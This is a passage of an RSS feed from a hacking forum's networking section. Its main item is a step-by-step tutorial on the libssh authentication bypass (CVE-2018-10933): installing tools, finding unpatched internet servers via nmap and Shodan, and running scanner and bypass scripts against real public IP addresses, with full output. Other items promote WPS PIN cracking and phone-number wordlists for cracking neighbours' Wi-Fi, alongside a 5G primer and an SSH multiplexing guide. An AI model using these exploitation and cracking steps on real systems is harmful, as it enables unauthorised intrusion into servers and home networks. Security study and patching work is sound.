          <link>https://0x00sec.org/t/ss7-and-telco-backbone-infrastructure/11450</link>
          <pubDate>Fri, 08 Feb 2019 02:08:10 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-11450</guid>
          <source url="https://0x00sec.org/t/ss7-and-telco-backbone-infrastructure/11450.rss">SS7 and Telco backbone infrastructure</source>
        </item>
        <item>
          <title>LibSSH Authentication Search and Bypass</title>
          <dc:creator><![CDATA[Ph03n1x_Crus4d3r]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p> <b>LIBSSH BACKGROUND</b></p>
<p>Computers all over the world rely on the libssh library. The issue with this is the release of bug CVE-2018-10933. Unfortunately for hackers, this server bug was patched soon after the release. Fortunately, however, for hackers, barely anyone takes the time to update their SSH libraries, so score there.</p>
<p><b>How the Exploit Works</b></p>
<p>In a normal SSH session, the user will attempt to log in with a username and password, and according to whether or not the credentials are valid, the server will accept or reject the connection. In the example below, we attempt to log in to a server running libssh with the wrong password by typing  <strong>ssh username@ipaddress</strong> into a terminal window.</p>
<pre><code class="lang-auto">ssh root@159.180.132.163

The authenticity of host '159.180.132.163 (159.180.132.163)' can't be established.
RSA key fingerprint is SHA256:Vkx9gDp1E/df1Yn0bDrgXIIYcTnyCVU6vmgqLKKqrhQ.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '159.180.132.163' (RSA) to the list of known hosts.
root@159.180.132.163's password:
Permission denied, please try again.
root@159.180.132.163's password:
Permission denied, please try again.
root@159.180.132.163's password:
root@159.180.132.163: Permission denied (publickey,keyboard-interactive,password).
</code></pre>
<p>Because we don’t know the password, the attempt to connect is rejected, and we are kept out of the server. On top of this, we are banned from connecting to that server for some time if we try to log in too many times and fail.</p>
<p>In versions of libssh with the bug in question, a user can trick the system into thinking they are already authenticated by sending an unexpected message indicating the connection already succeeded, bypassing the need to supply a password. It allows an attacker to gain complete control over the affected system with no knowledge of the password, and it represents a critical vulnerability in any system with affected versions of libssh.</p>
<p><b>So How Does This Bug Work?</b></p>
<p>Imagine if you could gain access to a stranger’s house by merely telling them you live there. In this trick, we skip the process of proving we belong with a password and instead send a “success” message.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3ee3fd1f38057509110eee71a7802891c061cff9.jpeg" alt="636775797021231764" data-base62-sha1="8Ym48T2JurbxmdjuGMzYn8LFARH" width="690" height="473"></p>
<p>This bug works when an attacker doesn’t try to log in the normal way at all, and instead sends the server a message that seems to confirm that the attacker has already authenticated. This “authentication succeeded” message confuses the server into granting access without a password, totally bypassing the normal security of the system.</p>
<p><b>Step 1:</b> INSTALL TOOLS AND DEPENDENCIES</p>
<p>The first program we will use to scan for vulnerable devices is called Nmap, which can <a href="https://nmap.org/book/install.html" rel="noopener nofollow ugc">easily be installed</a>. On Kali, it should than by default, but if it’s not, you can quickly download it with the following command.</p>
<pre><code class="lang-auto">apt install nmap
</code></pre>
<p>In order to detect if a device we discover is vulnerable, we will be using the Python program libssh-scanner. It’s is written in Python 2.7, so if you only have Python 3 installed, you will have to make sure to also <a href="https://www.python.org/download/releases/2.7" rel="noopener nofollow ugc">install Python 2.7</a>.</p>
<p>To install libssh-scanner, you need to clone the <a href="https://github.com/leapsecurity/libssh-scanner" rel="noopener nofollow ugc">libssh-scanner repository</a> by typing the following into a terminal window.</p>
<pre><code class="lang-auto">git clone https://github.com/leapsecurity/libssh-scanner.git
</code></pre>
<p>Then, after navigating inside the directory and listing its contents, you must install the required libraries by running the  <strong>pip</strong>  command seen below.</p>
<pre><code class="lang-auto">cd libssh-scanner
ls
pip install -r requirements.txt
</code></pre>
<p>Next, you must also install the program to thanperform the attack ,. This time, you’re cloning the <a href="https://github.com/purplesec/libSSH-Authentication-Bypass" rel="noopener nofollow ugc">“libSSH-Authentication-Bypass” repository</a> and installing any dependencies using the following commands.</p>
<pre><code class="lang-auto">git clone https://github.com/purplesec/libSSH-Authentication-Bypass.git
cd libSSH-Authentication-Bypass
pip install -r requirements.txt
</code></pre>
<p><b>Step 2:</b> USE NMAP TO SCAN FOR VULNERABILITIES</p>
<p>The first step to fixing or exploiting a vulnerable device is finding it, and it’s relatively easy to find devices on your local network that may require attention. To do so, we will use a program called Nmap to locate devices running an SSH server and determine if libssh is running on them. Nmap is an essential tool in any hacker’s toolkit, enabling one to quickly scan and discover all hosts and services on a given network or IP range.</p>
<p>In this case, we will scan the devices connected locally to our network, and Nmap will tell us whether or not each device on the network is using a vulnerable version of libssh. To follow this guide, you will need to install Nmap, but if you use Kali Linux, you likely already have Nmap installed.</p>
<p>To scan and discover all devices on the local network using libssh, open a terminal window and enter the following  <strong>nmap</strong>  command.</p>
<pre><code class="lang-auto">nmap -sV -p22 192.168.0.0/24
</code></pre>
<p>Breaking down the command,  <strong>nmap</strong>  tells the computer that we want to actually start using Nmap, while  <strong>-sV</strong>  tells Nmap that we want to perform a service scan, which grabs the banner of any service used by on an open port. The flag  <strong>-p22</strong>  tells Nmap to only scan devices on port 22, which is the standard port for SSH communication. While this might not find devices that use SSH on a different port, it will dramatically reduce search times.</p>
<p>Finally, the target expressed as a subnet range; The first three bytes of this will be unique to your search. When scanning a range of computers rather than just one, the 0/24 at the end is essential for searching the entire subnet. If you need to find your subnet range, you can use a tool like “<a href="https://www.linux.com/learn/intro-to-linux/2017/8/how-calculate-network-addresses-ipcalc" rel="noopener nofollow ugc">ipcalc</a>” which will calculate it for you. To do so, find your IP address from typing  <strong>ifconfig</strong> , then type  <strong>ipcalc yourIP</strong>  (replace “yourIP” with your IP address).</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c908973fba5abeabb5d14a6590a8f36a5c546a03.jpeg" alt="w1456" data-base62-sha1="sGqnokUMkSXHpu5wpKBOjiDaRvd" width="690" height="239"></p>
<p>The command will return a list of devices connected to the subnet, as well as some information gathered from the scanned port. In this case we are looking for any targets that are using a version of libssh earlier than 0.7.6. You can expect to see an output like below.</p>
<pre><code class="lang-auto">Nmap scan report for 172.16.42.1
Host is up (0.0098s latency).

PORT   STATE  SERVICE VERSION
22/tcp closed ssh

Nmap scan report for 172.16.42.32
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     libssh 0.7.2 (protocol 2.0)

Nmap scan report for 172.16.42.53
Host is up (0.079s latency).

PORT   STATE  SERVICE VERSION
22/tcp closed ssh

Nmap scan report for 172.16.42.67
Host is up (0.024s latency).

PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
</code></pre>
<p><b>Step 3:</b> DISCOVER LIBSSH VULNERABLE SERVERS</p>
<p>The vast majority of vulnerable servers will be accessible via a remote network, so we will need to search in a different way to find devices not connected directly to our LAN.</p>
<p>To find a remote target, you will need to take advantage of a service called <a href="https://www.shodan.io/" rel="noopener nofollow ugc">Shodan</a>, a search engine that can find any device connected to the web — unlike Google which only returns results from web servers on port 80. For example, instead of directing you to a website trying to sell you security cameras, Shodan can direct you to the login page of functioning IP cameras, potentially granting you access to the camera given the default password is unchanged.</p>
<p>Shodan will have indexed many vulnerable SSH servers, which we can look for both by port number and other keyword searches that reveal hosts running versions of libssh before 0.7.6 which we know to be affected by the vulnerability.</p>
<p>To start, <a href="https://account.shodan.io/register" rel="noopener nofollow ugc">sign up for a free account</a>, which allows you to view the first two pages of any search query, or about 20 unique devices. Then, to find servers vulnerable to the libssh exploit, you’ll need three terms in the search:</p>
<ul>
<li>
<strong>port:22</strong> , which is the default port for the SSH protocol. Even though SSH can be moved to any unused port, this isn’t too common because all it really does is prevent the server from being found with a simple scan for port 22.</li>
<li>
<strong>LibSSH</strong> , which returns any server that advertises using the libssh library, indicating that they are potentially exploitable.</li>
<li>
<strong>0.7.</strong>* , which limits the results of the search to devices that are using versions of libssh that start with “0.7.” and excludes more up-to-date versions from the results. While you may still get some results that are patched, you’ll eliminate most of the more updated devices with this filter.</li>
</ul>
<p>The search above will return a list of IP addresses that may be vulnerable to this attack, along with some more information that Shodan was able to retrieve. Shodan’s information can include a banner pull, the location of the device, the latest activity, and the organization in control of the server.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3f6373018b5301942b8d9ce84d08cccab62856ee.jpeg" alt="w1456%20(1)" data-base62-sha1="92L9hhwi3jdUjztUxnvItStTRqS" width="690" height="431"></p>
<p><b>Step 4:</b> TESTING LIBSSH VULNERABILITY ON SERVER</p>
<p>nce you have gathered a list of targets susceptible to the exploit, either local or remote, you can use “libssh-scanner” to scan target IP addresses and determine if they’re still likely vulnerable. Other tools can go even further to try establishing a shell, but it is very important to note that accessing another device using SSH without permission could violate the Computer Fraud and Abuse Act. Depending on who owns the device you access, this can land you in serious legal trouble.</p>
<p>In addition to legal considerations, you should be wary of connecting to devices from your real IP address that could be purposely vulnerable to this exploit. Honeypots are often set up this way to attract amateur hackers, and you could find yourself inside a device configured as a trap.</p>
<p>Now, use libssh-scanner to check if the targets gathered in steps 2 and 3 will actually be vulnerable to the exploit. To do this, create a TXT file containing all of the IP addresses found in steps 2 and 3, with each IP address separated by new lines. Name this text file “ips.txt” and place it inside the same folder as libssh-scanner was downloaded to earlier in step 1.</p>
<p>Once inside the directory, enter the following command into a terminal window.</p>
<pre><code class="lang-auto">python libsshscan.py --port 22 --aggressive ips.txt
</code></pre>
<p>The command will run Python 2.7, scan each IP address in the text file, and determine if the target is actually vulnerable to the CVE-2018-10933 security flaw. As you can see below, performing the scan narrowed down the list of potential targets from Shodan to just one — 159.180.132.163.</p>
<pre><code class="lang-auto">python libsshscan.py --aggressive --port 22 ips.txt

libssh scanner 1.0.4

Searching for Vulnerable Hosts...

* 52.151.63.100:22 is not vulnerable to authentication bypass (b'SSH-2.0-libssh-0.7.2')
* 13.57.20.28:22 is not vulnerable to authentication bypass (b'SSH-2.0-libssh-0.7.0')
* 132.206.51.74:22 is not vulnerable to authentication bypass (b'SSH-2.0-libssh-0.7.0')
* 18.221.40.109:22 is not vulnerable to authentication bypass (b'SSH-2.0-libssh-0.7.0')
* 52.1.165.128:22 is not vulnerable to authentication bypass (b'SSH-2.0-libssh-0.7.0')
* 54.86.221.162:22 is not vulnerable to authentication bypass (b'SSH-2.0-libssh-0.7.0')
* 52.173.202.21:22 is not vulnerable to authentication bypass (b'SSH-2.0-libssh-0.7.0')
* 54.193.60.245:22 is not vulnerable to authentication bypass (b'SSH-2.0-libssh-0.7.0')
! 159.180.132.163:22 is likely VULNERABLE to authentication bypass (b'SSH-2.0-libssh-0.7.2')
* 34.194.133.107:22 is not vulnerable to authentication bypass (b'SSH-2.0-libssh-0.7.0')

Scanner Completed Successfully
</code></pre>
<p>To check the one result, use libSSH-Authentication-Bypass to test the attack. Change directory into the folder you downloaded libSSH-Authentication-Bypass to previously in step 1, and enter the following command, substituting “159.180.132.163” with the IP address you wish to scan.</p>
<pre><code class="lang-auto">python3 libsshauthbypass.py --host 159.180.132.163
</code></pre>
<p>The command returns the following output on a server that has been partially patched but is still vulnerable to the authentication bypass.</p>
<pre><code class="lang-auto">python3 bypasswithfakekey.py --host 159.180.132.163
DEBUG:paramiko.transport:starting thread (client mode): 0x74a0d30
DEBUG:paramiko.transport:Local version/idstring: SSH-2.0-paramiko_2.0.8
DEBUG:paramiko.transport:Remote version/idstring: SSH-2.0-libssh-0.7.2
INFO:paramiko.transport:Connected (version 2.0, client libssh-0.7.2)
DEBUG:paramiko.transport:kex algos:['diffie-hellman-group14-sha1', 'diffie-hellman-group1-sha1'] server key:['ssh-rsa'] client encrypt:['aes256-ctr', 'aes192-ctr', 'aes128-ctr', 'aes256-cbc', 'aes192-cbc', 'aes128-cbc', 'blowfish-cbc', '3des-cbc'] server encrypt:['aes256-ctr', 'aes192-ctr', 'aes128-ctr', 'aes256-cbc', 'aes192-cbc', 'aes128-cbc', 'blowfish-cbc', '3des-cbc'] client mac:['hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib', 'zlib@openssh.com'] server compress:['none', 'zlib', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
DEBUG:paramiko.transport:Kex agreed: diffie-hellman-group1-sha1
DEBUG:paramiko.transport:Cipher agreed: aes128-ctr
DEBUG:paramiko.transport:MAC agreed: hmac-sha2-256
DEBUG:paramiko.transport:Compression agreed: none
/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/paramiko/rsakey.py:130: CryptographyDeprecationWarning: signer and verifier have been deprecated. Please use sign and verify instead.
  algorithm=hashes.SHA1(),
DEBUG:paramiko.transport:kex engine KexGroup1 specified hash_algo &lt;built-in function openssl_sha1&gt;
DEBUG:paramiko.transport:Switch to new keys ...
/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/paramiko/client.py:689: UserWarning: Unknown ssh-rsa host key for 159.180.132.163: b'7a7f8ca5b97cdd9356114ac650cc1353'
  key.get_fingerprint())))
DEBUG:paramiko.transport:userauth is OK
INFO:paramiko.transport:Authentication (password) failed.

Auth Bypassed of the server you trying to bypass but  can't spawn the shell it's patched, truncated or using wrong vulnerable libSSH version. -blacknbunny
</code></pre>
<p>If you see a message indicating the connection is successful, then you’ve confirmed the vulnerability on the device you’re testing. If the connection fails, or you see a partially successful result like above, then you’ve confirmed that the issue does not affect the target (even though it may need to be updated anyway if you get a partial success).</p>
<p><b>Consideration:</b> HOW TO DEFEND AGAINST ATTACK</p>
<p>If you are managing a server that uses libssh to manage SSH communication, it is important to ensure that you are using libssh version 0.7.6 or newer, as this when the libssh developers patched the issue.</p>
<p>To reduce the likelihood of being found on Shodan, you should avoid forwarding ports to the open internet. In general, it’s better to use a VPN to access your local network, thus preventing your ports from being exposed to the internet at all.</p>
<p>If you’re worried about your devices showing up on Shodan, you can check to see if your IP address has ports being forwarded using <a href="https://routersecurity.org/shodan.php" rel="noopener nofollow ugc">Router Security</a>, which lets you see information about your public IP address.</p>
<p>I hope you enjoyed this tutorial/info session. This is my first post so leave recommendations in the comments. Thanks!</p>
            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/libssh-authentication-search-and-bypass/10436">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/libssh-authentication-search-and-bypass/10436</link>
          <pubDate>Sat, 22 Dec 2018 02:50:24 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-10436</guid>
          <source url="https://0x00sec.org/t/libssh-authentication-search-and-bypass/10436.rss">LibSSH Authentication Search and Bypass</source>
        </item>
        <item>
          <title>TheReaver! Automate WPS PIN Cracking tool</title>
          <dc:creator><![CDATA[Virgula]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/28a6daffc5eb9008b62ef34d98275fb9bc9256d2.png" alt="5jTwN3d.png" width="" height=""></p>
<p><strong>TheReaver it’s a tool written in bash born to execute  WPS attacks and based on the output of pins of 3wifi stascorp com service testing with the famous software reaver. <a href="http://3wifi.stascorp.com" rel="noopener nofollow ugc">3wifi.stascorp.com</a> is an html page that has javascript code also working offline (already on github) to calculate in a precise way all possibles WPS PINS of BSSID typed in input.</strong></p>
<p><strong>After that you can save the results in a txt, then you have to indicate the path to TheReaver Program when it asks “Insert Pin File (DEFAULT Pins in db):”.</strong></p>
<p><strong>Program will automatically recognize the format of the input and will begin to try all PINS and if attack ends succesfully you will get all infos about the attack with the password in clear format! (It accept also only PIN or whetever kind of format except for text before the PIN number).</strong></p>
<p><strong>There is also a local database with known common pins based on airgeddon project. To proceed with this method you have to leave blank the previous question =&gt; “Insert Pin File (DEFAULT Pins in db):”. Warning! Try this at last chance Because Default Router’s PIN are few and the attack could fail.</strong></p>
<p>More info and project on GitHub check out:</p>

Summary <a href="https://0x00sec.org/t/thereaver-automate-wps-pin-cracking-tool/8648/1">(click for more details)</a>
            <p><small>10 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/thereaver-automate-wps-pin-cracking-tool/8648">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/thereaver-automate-wps-pin-cracking-tool/8648</link>
          <pubDate>Sat, 22 Sep 2018 19:13:02 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-8648</guid>
          <source url="https://0x00sec.org/t/thereaver-automate-wps-pin-cracking-tool/8648.rss">TheReaver! Automate WPS PIN Cracking tool</source>
        </item>
        <item>
          <title>[Wifi] The Perfect Suburban Wordlist</title>
          <dc:creator><![CDATA[number28]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>Recently I moved into a new suburban neighborhood littered with default router access points. One day, I decided I wanted to test my luck and see what I could get by using a simple but very effective <em>Wordlist</em></p>
<p>A few years ago I use to work as a cable installation technician. I’ve noticed most technicians will ask the customer if they would like to change their default password for the router. Rather than awaiting for the customer’s timely response, a technician may  insist: <em>“We can always set the password to your phone number, and you can change it later if you’d like.”</em> This is very convenient for the customer, and its likely they’ll never change it anyhow.</p>
<blockquote>
<p><strong>Using crunch to create a simple wordlist:</strong> you can generate a <em>phone number list</em> for whatever area code the router happens to be located in.</p>
</blockquote>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/3/3eccd0c7c73a1a4afe3ae3dcfeaf28a103ab4a93.png" alt="crunch" data-base62-sha1="8XypWxSVxarg50BOhB5xfLQDrnJ" width="690" height="182"></p>
<blockquote>
<p><em>In layman’s terms, The -t specifies a specific pattern. The % character specifies to use a number and  -s lets you choose where to begin. (If you’d like to bypass the phone numbers starting in the 000’s and 100’s.)</em></p>
</blockquote>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/1/18ee5b230b173cbffdee4bf41055646fe3dc542b.png" alt="crunch-wordlist" data-base62-sha1="3yy8lGlugu8Ao2b6SMwcbaYJcJZ" width="102" height="129"></p>
<blockquote>
<p><em>Your generated wordlist will look something like this</em></p>
</blockquote>
<p>Not only is this is a great list to have for suburban environments, but it may be great for business AP’s as well. I’ve been told alot of businesses typically use their fax number for their AP. I’ve come to find this is a very effective wordlist and I don’t see it mentioned to much.</p>
<p><strong>Find the area code you’re working in and give it a go!</strong></p>
            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/wifi-the-perfect-suburban-wordlist/6263">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/wifi-the-perfect-suburban-wordlist/6263</link>
          <pubDate>Wed, 11 Apr 2018 11:59:26 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-6263</guid>
          <source url="https://0x00sec.org/t/wifi-the-perfect-suburban-wordlist/6263.rss">[Wifi] The Perfect Suburban Wordlist</source>
        </item>
        <item>
          <title>Mobile Generations and the rise of 5G</title>
          <dc:creator><![CDATA[Nanobyte]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>Greeting to the Community of 0x00sec ,<br>
I am Nanobyte and this is my first post on this forum so please excuse me for any mistakes or any misinfo that I may write!<br>
This essay is about the rise of mobile technologies and the rise of the newest technology the 5G so without further a do …<br>
For someone who may not be familiar with the “G” staff : <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
<p>1G refers to the first generation of mobile communications and it is simply the beggining of every wireless technology followed . It simply used the analog telecommunications standards that were introduced in the 1980s . People couldn’t do anything more that just make the classic phone call that we all know today .</p>
<p>2G comes next after a decade and introduces the abiltity of the existing mobile network to transmit data . Do not confuse the data with internet data though … By data in 2G we refer in the classic SMS that we know today . Well it was a big thing at the time …</p>
<p>3G followed and finally allows users to surf the web through their mobile phones with small bandwidth (Approx. 200Kbps - 1Mbps / sec ) . Also introducing the classic GPS as we know it today.</p>
<p>Fast Forward 4G also known as LTE (Long Term Evolution) joins the game in the begging of the 2010s. Higher speeds are introduced (Approx. 100Mbps - 1 Gbps ) and people are starting to use their mobile phones even more outdoors . However there where problems as concerns the 4G networking especially with the speed of the network as it was promised 100mpbs - 1gpbs / user and it never even made it to 40mbps … So here is the trick 4G+ (LTE-A) is placed as an idea in order to inprove the already existing 4G network to solve the speed problem among with the latency and the bugs that existed. So here we are in 2018 using 4G+ but is that all?</p>
<p>5G is an upcoming network that promises even more ! 5G wants to connect everything possible in the mobile networking. From self-driving vehicles to e-health care systems and the legandary “unsecure” IoT . Promises latencies less that 1msec so that it will be imposible for the human eye to realise any latency (although that will become really controversial as we are going to have and machine to machine communications and not just machine to human) .</p>
<p>So what’s the deal with 5G ?</p>
<p>5G will have some new technologies that will change mobile communications and will elavate them for good. Millimeter waves will open more frequencies (30 - 300 Ghz) so that more bandwidth will be given to any kind of device .<br>
The problem however is that millimeter waves are too vulnerable when we talk about transmitting them through air where there are hundreds of disruptions for the signal (rain , sounds , walls) . So we need Small Cells technologies . For someone who may not know mobile technologies use cellular technologies which someone can read more <a href="https://en.wikipedia.org/wiki/Cellular_network" rel="nofollow noopener">here</a> . Small cells will have smaller ranges for an antenna to work so that the signal will be easier to be transimmited however for smaller antennas to exist the number must increase drammatically and so must the cost . MIMO (or Multiple Input Multiple Output) is the next big technological step for 5G . For this technology the antennas are going to increase in the way they accept and send data . More about that <a href="https://5g.co.uk/guides/what-is-massive-mimo-technology/" rel="nofollow noopener">here</a> . Last but not least 5G will allow full duplex communications over data transmitted through the devices . The phenomenon which allowed radiowaves to only transmit or recieve is called <a href="https://en.wikipedia.org/wiki/Reciprocity_(electromagnetism)" rel="nofollow noopener">Reciprocity</a> and it is hopped to be solved in 5G .</p>
<p>The above was the knowledge which I possess for the mobile networks . Please feel free to correct anything (if wrong) and to add if you happen to know anything more .  Hope u liked it and in the next essay I’ll try to analyse potential security problems with these technologies .</p>
            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/mobile-generations-and-the-rise-of-5g/6186">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/mobile-generations-and-the-rise-of-5g/6186</link>
          <pubDate>Fri, 06 Apr 2018 13:32:41 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-6186</guid>
          <source url="https://0x00sec.org/t/mobile-generations-and-the-rise-of-5g/6186.rss">Mobile Generations and the rise of 5G</source>
        </item>
        <item>
          <title>Gaining Domain Admin from Outside Active Directory</title>
          <dc:creator><![CDATA[drzel0st]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>So, I am again up with a new article to share. It is a great write-up by Rob Brown. It is about penetration testing an Active Directory. This is useful for the penetration testers who are into internal penetration testing.</p>
<p><a href="https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html" class="onebox" target="_blank" rel="nofollow noopener">https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html</a></p>
            <p><small>6 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/gaining-domain-admin-from-outside-active-directory/5722">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/gaining-domain-admin-from-outside-active-directory/5722</link>
          <pubDate>Mon, 05 Mar 2018 19:06:15 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-5722</guid>
          <source url="https://0x00sec.org/t/gaining-domain-admin-from-outside-active-directory/5722.rss">Gaining Domain Admin from Outside Active Directory</source>
        </item>
        <item>
          <title>Stupid Nix Tricks: SSH Multiplexing</title>
          <dc:creator><![CDATA[fraq]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>At this point, it should basically be “Stupid SSH tricks™”, but whatever.</p>
<p>Prerequisites:  Basic understanding of *nix and SSH</p>
<h2>Scenario</h2>
<p>You have a server behind a firewalled network and you need to connect. You <em>could</em> just do something like <code>ssh first-server</code> and from there <code>ssh internal-server</code>. Not too bad, right?</p>
<p>What if there’s a whole subnet of servers that you might wanna reach? What if you don’t wanna SSH twice? What if you’re using something that wants to execute from your local machine but can’t really handle the manual two step SSH jump (such as <a href="https://www.ansible.com/" rel="nofollow noopener">Ansible</a>)</p>
<p>This is where SSH Multiplexing comes in <em>very</em> handy</p>
<h2>Solution, part 1: Pivot box</h2>
<p>As you probably expected by now, we’re going to be digging into our ssh config file, so go ahead and pop an editor open to <code>~/.ssh/config</code></p>
<p>The first thing we want to do is setup our “gateway” or “bastion” or “jump” host. Whatever you want to call it. Doesn’t matter to me. Here’s an excerpt of mine with a breakdown of each line in the config</p>
<pre><code class="lang-auto">host jump
  User fraq
  Hostname foo.bar.baz
  ControlMaster auto
  ControlPath ~/.ssh/proxy-%r@%h:%p
  ControlPersist 5m
</code></pre>
<p><code>host jump</code> defines a friendly name in SSH for your machine. Note that this isn’t in <code>/etc/hosts</code>, so you can’t <code>ping jump</code>, but you can <code>ssh jump</code>. When you do use <code>ssh jump</code>, ssh opens up the config file, looks for a host entry that matches, and then uses that config to build the connection. Nothing we haven’t covered already in previous chapters.</p>
<p><code>User fraq</code> is the username we use to connect to <code>jump</code></p>
<p><code>Hostname foo.bar.baz</code> means that we connect to a server called <code>foo.bar.baz</code> in DNS. This can also be an IP address.</p>
<p>These next three are the ones you need for multiplexing:<br>
<code>ControlMaster auto</code> tells the ssh connection that you want to listen for control connections (used for multiplexing)</p>
<p><code>ControlPath</code> tells ssh where to put the control socket for the connections and how to format the file names. Per the OpenSSH cookbook:</p>
<blockquote>
<p>The combination %r,  %h and %p stand for the remote user name, the remote host and the remote host’s port. The control sockets should be given unique names.</p>
</blockquote>
<p><code>ControlPersist</code> tells ssh how long to leave the master open.</p>
<h2>Solution, part 2: Target box</h2>
<p>Now that your jump host is setup to accept multiplexed SSH connections, it’s time to tell the SSH how to connect to your target box <em>through</em> the jump box.</p>
<pre><code class="lang-auto">Host target
    ProxyCommand ssh -W %h:%p jump
    User fraq
    Hostname 10.10.10.10
</code></pre>
<p>As you can see, it looks very similar to a standard config file, except for the <code>ProxyCommand</code> option. This tells the ssh connection to execute that command <em>first</em> as a prerequisite for connecting to the target machine. In our case, we’re saying that we want to <code>ssh -W</code> through the machine known to ssh as <code>jump</code>.</p>
<h2>Conclusion</h2>
<p>With this in place, you can now use <code>jump</code> as a pivot to get into internal networks that it can access but you cannot, all without having to <code>ssh</code> twice manually. This means scripts or tools that invoke <code>ssh</code> can be used locally on your machine as well.</p>
<p>And yes, this can be chained basically indefinitely, so you can create some pretty long and crazy proxy connections.</p>
<p>Also, I very intentionally skipped over the in-depth explanation of <code>ssh -W</code> and the older <code>ssh nc</code> implementation. The whole purpose of this post was just to setup ssh multiplexing.</p>
<h3>References</h3>
<p><a href="https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Multiplexing" class="onebox" target="_blank" rel="nofollow noopener">https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Multiplexing</a></p>
            <p><small>12 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/stupid-nix-tricks-ssh-multiplexing/5583">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/stupid-nix-tricks-ssh-multiplexing/5583</link>
          <pubDate>Thu, 22 Feb 2018 15:51:41 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-5583</guid>
          <source url="https://0x00sec.org/t/stupid-nix-tricks-ssh-multiplexing/5583.rss">Stupid Nix Tricks: SSH Multiplexing</source>
        </item>
  </channel>
</rss>
